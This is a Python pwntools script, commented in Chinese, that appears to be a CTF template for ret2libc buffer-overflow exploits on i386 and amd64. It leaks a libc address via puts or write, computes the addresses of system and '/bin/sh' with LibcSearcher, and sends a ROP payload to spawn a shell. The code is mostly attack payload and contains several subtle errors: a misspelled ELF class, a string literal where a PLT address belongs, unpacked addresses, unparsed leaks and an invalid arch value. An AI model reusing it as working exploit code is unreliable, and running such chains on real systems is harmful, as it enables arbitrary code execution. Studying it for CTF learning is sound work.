from pwn import *
from LibcSearcher import LibcSearcher

def ret2libc_i386_mannul():
    '''
    ret2libc，X86架构下，手动写rop链
    一般是结合LibcSearcher进行泄露system地址
    如果需要一些其他的操作，可以找一些pop指令用于清理栈
    
    '''
    elf = Elf('')
    io = process('')
    payload = b'xxx' # 前面的偏移
    payload += b'puts_plt' # 用于泄露地址的函数
    payload += elf.sym['main'] # 返回main函数
    payload += elf.got['puts'] # 要泄露的函数的got地址，这里泄露puts函数的地址
    io.send(payload)
    leak_addr = io.recv(4) # 获取到puts的地址
    # 接下来利用libcsearcher库来泄露函数地址
    libc = LibcSearcher('puts', leak_addr)
    libc_base_addr = leak_addr - libc.dump('puts')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    
    # 第二次填充payload，执行system /bin/sh
    payload = b'xxx'
    payload += p32(system_addr)
    payload += b'aaaa'
    payload += p32(str_bin_sh)
    io.send(payload)
    


def ret2libc_amd64_mannual():
    '''
    ret2libc X64架构下 手动写payload
    '''
    elf = Elf('')
    io = process('')
    pop_rdi_ret_addr = 0x0 # 一下三个都是gadget，可以利用ROPgadget工具寻找
    pop_rsi_ret_addr = 0x0
    pop_rdx_ret_addr = 0x0
    payload = b'xxx' # 前面的偏移，直到函数返回地址
    payload += p64(pop_rdi_ret_addr) + p64(1) # write函数的第一个参数
    payload += p64(pop_rsi_ret_addr) + p64(elf.got['read']) # 第二个参数
    payload += p64(pop_rdx_ret_addr) + p64(0x20) # 第三个参数
    payload += p64(elf.plt['write']) # write函数的地址
    io.send(payload) 
    leak_addr = io.recv(6) #泄露出来的地址
    # 利用libc来计算
    libc = LibcSearcher('read', leak_addr)
    libc_base_addr = leak_addr - libc.dump('read')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    
    payload = b'xxx'
    payload += p64(pop_rdi_ret_addr) + p64(str_bin_sh)
    payload += p64(system_addr)
    io.send(payload)
    
def ret2libc_pwntools():
    '''
    ret2libc。
    利用pwntools的工具来写payload，主要利用ROP类
    记得设置一下context, 改下架构即可
    '''
    context.update(arch='i386/amd64', os='linux', endian='little')
    elf = Elf('')
    io = process('')
    rop = ROP(elf)
    rop.raw(b'xxx') # 前面的填充
    rop.call('write', [1, elf.got['write'], 0x10]) # 调用write函数
    rop.call('main', []) # 回到main函数
    print(rop.dump()) # 这里打印下rop，可以检查一下有没有问题
    payload = rop.chain() # 生成payload
    io.send(payload)
    leak_addr = io.recv()
    # 利用libc来计算
    libc = LibcSearcher('read', leak_addr)
    libc_base_addr = leak_addr - libc.dump('read')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    
    # 这里调用system可以这样
    rop = ROP(elf)
    rop.raw(b'xxx')
    rop.call(system_addr, [str_bin_sh])
    io.send(rop.chain())
    
    